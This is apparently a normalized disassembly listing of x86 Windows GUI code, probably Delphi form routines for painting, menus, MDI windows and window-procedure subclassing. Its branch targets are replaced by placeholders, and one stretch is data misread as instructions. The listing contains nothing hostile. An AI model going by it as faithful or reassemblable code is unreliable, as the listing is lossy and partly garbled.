call sub_42138c
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459332
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4214ec
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_4464d0
mov esi eax
sub_45934f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ReleaseDC
retn
sub_459400
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45944c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_459928
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_459974
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45948c
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_45965a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_420c6c
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44414c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43f7f4
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43e5ec
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_459400
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_420c6c
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_459928
test eax eax
je r-xdata
push ebp
call sub_459400
pop ecx
push ebp
call sub_459400
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_45944c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_456764
jmp r-xdata
sub_45966c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_457934
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_4596d8
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_457fd0
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax ebx
call sub_41d6bc
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_4464d0
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_4432bc
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_4464d0
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41d690
call sub_453a24
mov edx esi
mov eax ebx
call sub_41d690
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
sub_459770
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_4597ed
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_4597f8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_443a38
sub_459824
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_443a38
xor edx edx
jmp r-xdata
mov eax esi
call sub_457ab0
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_45985c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_43f4b4
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_443a38
sub_4598a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43f5c0
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_4598f4
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43cb90
sub_459928
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45d498
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45d484
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_459974
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45d498
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45d484
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4599c4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_417414
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_4599f4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_4464d0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45d468
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45d468
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_4599c4
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45d468
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45d454
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_417570
call sub_4032e8
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45d454
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45d454
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45d454
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_459af8
push ebx
mov ebx eax
mov eax ebx
call sub_459af0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_4271b4
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_459b20
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_4439f0
mov dl 0x1
mov eax esi
call sub_459e84
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_459f00
mov edx eax
mov eax esi
call sub_43fe50
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_443b8c
mov dl 0x1
mov eax esi
call sub_458ea4
sub_459ba0
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_4464d0
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_450020
mov edi eax
mov eax ebp
call sub_4464d0
push eax
call DrawMenuBar
sub_459c1c
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41d168
xor edx edx
mov eax ebx
call sub_4519b8
sub_459c40
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_459ba0
mov eax edx
mov edx ebx
call sub_41d168
sub_459c68
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_459e2e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45d498
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_45356c
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45d484
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41d168
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45d484
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
mov eax ebx
call sub_4467d4
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_4464d0
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_459ba0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459e35
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov dl 0x1
mov eax ebx
call sub_45ad2c
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_4464d0
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_4464d0
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_4464d0
mov edx eax
mov eax esi
call sub_45356c
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_4464d0
push eax
call SetMenu
sub_459e50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_459e3c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_459eac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_459ea0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_459f18
push ebx
mov ebx eax
mov eax ebx
call sub_445ab0
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_459f00
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_459f00
mov edx eax
mov eax ebx
call sub_43fe50
mov edx 0xff00000f
mov eax ebx
call sub_43fe50
pop ebx
retn
sub_459f9c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4464d0
push eax
call ShowWindow
sub_459fdc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4599f4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_4599f4
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45d468
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d454
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_4599f4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45d454
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45d468
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45d454
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d158
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d13c
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d124
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45d454
call sub_45d124
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d124
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d170
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d158
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d13c
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d124
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d170
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d158
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45d454
call sub_45d158
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d158
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d13c
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d124
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d170
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d124
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d170
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d158
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45d454
call sub_45d13c
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_45a330
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4578e4
mov edx esi
mov eax edi
call sub_45ccd4
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_45a3df ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4432bc
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4432bc
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_45a541
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4578f4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov eax ebx
call sub_45aea0
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_43f6b4
push eax
mov eax ebx
call sub_43f6f8
push eax
mov eax ebx
call sub_4464d0
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406d30
mov [ ebx + 0x254 ] eax
push ebx
push sub_45948c
call sub_41e128
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
